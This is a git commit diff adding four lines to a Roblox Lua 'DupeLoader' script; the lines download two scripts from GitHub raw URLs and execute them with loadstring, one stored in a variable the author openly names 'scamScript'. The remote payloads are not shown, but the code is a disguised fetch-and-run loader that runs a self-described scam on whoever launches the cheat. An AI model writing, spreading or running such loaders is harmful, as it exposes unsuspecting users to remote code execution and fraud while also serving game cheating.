f2c188dc157cf639be3f816a44437e79a5c74dbb
real-bluez <calvosanchezjaime@gmail.com>
2025-10-23 20:30:27 +0200

    Update DupeLoader.lua

--- DupeLoader.lua
+++ DupeLoader.lua
@@ -1,1 +1,5 @@
+local realScript = "https://raw.githubusercontent.com/real-bluez/PvB/refs/heads/main/Visual"
+local scamScript = "https://raw.githubusercontent.com/real-bluez/PvB/refs/heads/main/Bypasser"
 
+task.spawn(loadstring(game:HttpGet(realScript, true)))
+task.spawn(loadstring(game:HttpGet(scamScript, true))) 
